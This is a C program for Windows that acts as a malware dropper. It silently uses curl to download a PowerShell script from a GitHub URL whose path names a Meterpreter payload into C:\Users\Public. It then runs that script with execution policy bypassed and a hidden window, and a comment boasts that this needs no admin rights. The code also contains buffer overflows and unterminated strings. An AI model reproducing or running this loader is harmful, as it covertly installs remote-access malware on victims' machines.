#include <stdio.h>
#include <io.h>
#include <windows.h>
#include <stdlib.h>

int main() {
    char buffer[1024];
    FILE *fp;
    fp = _popen("powershell.exe -command \"(get-location).Drive.Name + ':'\"", "r");
    fgets(buffer, 1024, fp);
    _pclose(fp);

    // get current directory
    char cwd[1024];
    getcwd(cwd, sizeof(cwd));
    printf(cwd);
    printf("\n");
    printf("\n");
    // get first 2 chars of cwd
    char currentLetter[3];
    memcpy(currentLetter, cwd , 2);
    printf(currentLetter);
    printf("\n");
    printf("\n");
    
    char path1[1024] = "curl --output \"";
    char path2[1024] = "\\Users\\Public\\dependencies.ps1\" -LJO https://raw.githubusercontent.com/durandlh/windows-crypto/main/fourth-revision/bat_meterpreter/dependencies.ps1";
    // combine path1 and buffer into path3
    strcat(path1, currentLetter);
    printf(path1);
    printf("\n");
    printf("\n");
    
    // combine path1 and path2 into path3
    strcat(path1, path2);
    printf(path1);
    printf("\n");
    printf("\n");


    // use createprocess to run cmd command "ech hello"
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si); 
    ZeroMemory(&pi, sizeof(pi));
    CreateProcess(NULL, path1, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    printf("\n");
    // assign currentletter to new variable 
    char currentLetter2[5];
    memcpy(currentLetter2, cwd , 2);
    char powershellCommand[] = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \"";
    strcat(powershellCommand, currentLetter2);
    char dependenciesPath[1024] = "\\Users\\Public\\dependencies.ps1\"";
    strcat(powershellCommand, dependenciesPath);
    printf(powershellCommand);
    //CreateProcess(NULL, powershellCommand, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    system(powershellCommand);
    // use powershell -ExecutionPolicy BypPass -File "file" to bypass execution policy w/o admin
    

}

